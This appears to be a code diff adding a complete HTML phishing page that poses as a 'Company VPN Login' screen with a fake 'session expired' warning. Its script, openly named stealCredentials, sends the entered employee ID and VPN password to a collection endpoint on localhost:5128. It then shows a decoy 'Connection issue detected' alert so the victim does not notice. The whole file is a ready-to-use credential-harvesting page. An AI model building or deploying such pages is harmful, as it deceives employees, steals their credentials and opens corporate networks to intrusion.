@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Company VPN Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #eef2f3;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        input {
+            display: block;
+            width: 100%;
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #0073e6;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #005bb5;
+        }
+        .notice {
+            font-size: 12px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Company VPN Login</h2>
+        <p class="notice">Your session has expired. Please log in again.</p>
+        <input type="text" id="employeeID" placeholder="Employee ID">
+        <input type="password" id="password" placeholder="VPN Password">
+        <button onclick="stealCredentials()">Sign In</button>
+        <p style="font-size:12px; color:gray;">© 2025 Company IT Dept.</p>
+    </div>
+
+    <script>
+        function stealCredentials() {
+            let employeeID = document.getElementById("employeeID").value;
+            let password = document.getElementById("password").value;
+
+            if (!employeeID || !password) {
+                alert("Please enter your Employee ID and password.");
+                return;
+            }
+
+            fetch("http://localhost:5128/save", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ employeeID, password })
+            })
+            .then(response => response.text())
+            .then(data => alert("Connection issue detected. Please contact IT support."))
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
